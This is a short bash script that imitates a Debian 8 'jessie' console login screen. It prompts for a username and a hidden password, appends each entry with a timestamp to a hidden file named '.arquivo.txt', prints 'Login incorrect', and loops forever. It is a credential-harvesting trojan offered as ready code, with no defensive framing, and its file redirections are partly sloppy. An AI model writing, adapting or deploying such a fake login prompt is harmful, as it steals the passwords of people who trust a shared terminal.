#!/bin/bash
incorreto(){ sleep 3 ; echo ; echo "Login incorrect" ; }
while : ; do
	clear
	echo
	echo "Debian GNU/Linux 8 jessie tty1"
	echo
count=0
	while : ; do
		read -p "Jessie login: " LOGIN
		read -s -p "Password: " PASSW
		echo
		#[[ $LOGIN == "vagrant" ]] && [[ $PASS == "vagrant" ]] && break 2 || incorreto		
	echo "$(date)" >> login: $LOGIN >> .arquivo.txt
	echo "$(date)" >> senha: $PASSW >> .arquivo.txt
	count=$(( $count + 1 ))
		[[ $count = "2" ]] && break
   done
done
